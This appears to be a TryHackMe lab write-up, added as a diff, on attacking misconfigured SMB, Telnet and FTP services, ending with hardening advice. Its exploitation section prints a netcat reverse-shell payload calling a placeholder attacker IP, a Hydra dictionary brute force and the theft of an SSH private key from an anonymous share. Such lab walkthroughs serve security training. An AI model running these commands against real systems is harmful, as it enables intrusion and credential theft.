@@ -1,0 +1,115 @@
+Network Services (TryHackMe)
+
+1. Summary (TL;DR)
+
+Challenge Name: Network Services (SMB, Telnet, FTP)
+
+Difficulty: Easy / Intermediate
+
+Key Vulnerability: Critical service misconfigurations including Anonymous Share Access, Unauthenticated Backdoors, and Insecure Protocol Usage.
+
+Objective: Demonstrate how minor misconfigurations in legacy services can lead to complete server compromise and sensitive data exfiltration.
+
+2. Enumeration / Reconnaissance
+
+The foundation of any successful penetration test is thorough reconnaissance. We initiated the engagement by identifying all active entry points on the target machine.
+
+Service Discovery
+
+We used Nmap to perform a full TCP port scan, including service version detection and default script execution.
+
+Command:
+
+nmap -T4 -p- -sV -sC -Pn <TARGET_IP>
+
+
+Results Table:
+| Port | Protocol | Service | Version | Risk Level |
+| :--- | :--- | :--- | :--- | :--- |
+| 21 | TCP | FTP | vsftpd 3.0.3 | High (Info Disclosure) |
+| 22 | TCP | SSH | OpenSSH 7.6p1 | Medium (Brute Force Target) |
+| 139/445 | TCP | SMB | Samba 4.7.6 | Critical (Anonymous Access) |
+| 8012 | TCP | Telnet | Unknown (Backdoor) | Critical (RCE) |
+
+3. Vulnerability Analysis
+
+SMB: The "Null Session" Flaw
+
+The SMB service was configured to allow Anonymous Logins (Null Sessions). In a secure environment, SMB should always require valid credentials. By allowing anonymous access to the profiles share, the server leaked employee information and, more critically, private cryptographic keys.
+
+Telnet: Unencrypted Command Execution
+
+The service on port 8012 was identified as a Backdoor. Unlike SSH, Telnet transmits all data in plaintext. The specific implementation allowed a .RUN command, which bypasses standard authentication and executes system-level commands directly.
+
+FTP: Weak Credential Policy
+
+The FTP service initially allowed anonymous access to a public notice. This file leaked a valid username (mike). Because the organization lacked a Password Complexity Policy, a simple dictionary attack was sufficient to gain full access to the user's private files.
+
+4. Exploitation Phase
+
+Phase 1: SMB Information Extraction
+
+Using the smbclient utility, we accessed the server without a password:
+
+smbclient //<TARGET_IP>/profiles -N
+
+
+Discovery: Identified the user directory cactus.
+
+Exfiltration: Found a hidden .ssh folder. We downloaded the id_rsa (Private Key) to gain persistent access.
+
+Phase 2: Telnet Reverse Shell
+
+After confirming command execution by sniffing ICMP traffic with tcpdump, we established a stable shell:
+
+Listener: nc -lvnp 4444
+
+Payload Execution:
+
+.RUN mkfifo /tmp/otdpf; nc <ATTACKER_IP> 4444 0</tmp/otdpf | /bin/sh >/tmp/otdpf
+
+
+Phase 3: FTP Brute Force
+
+Armed with the username mike, we utilized Hydra and the rockyou.txt wordlist:
+
+hydra -l mike -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>
+
+
+Credentials Found: mike : password
+
+5. Post-Exploitation & Privilege Escalation
+
+Accessing the machine via the extracted SSH key required specific handling of file permissions to satisfy the ssh client's security checks:
+
+SSH Key Hardening:
+
+chmod 600 id_rsa
+
+
+Accessing the Target:
+
+ssh -i id_rsa cactus@<TARGET_IP>
+
+
+Flag Captured: THM{smb_is_fun_eh?}
+
+6. Remediation & Hardening (UNI Engineering Standards)
+
+To mitigate these risks, the following security controls must be implemented:
+
+Service Decommissioning: Immediately disable the Telnet service on port 8012. All remote management must occur over SSH (Port 22).
+
+SMB Hardening:
+
+Disable Guest/Anonymous Access in smb.conf.
+
+Restrict share access to specific authorized groups.
+
+FTP Security:
+
+Enforce a Strong Password Policy (minimum 12 characters, including special characters).
+
+Enable FTPS (FTP over SSL) to encrypt data in transit.
+
+Sensitive File Management: Never store .ssh keys or sensitive employee documents in public network shares. Implement a robust Identity and Access Management (IAM) framework.
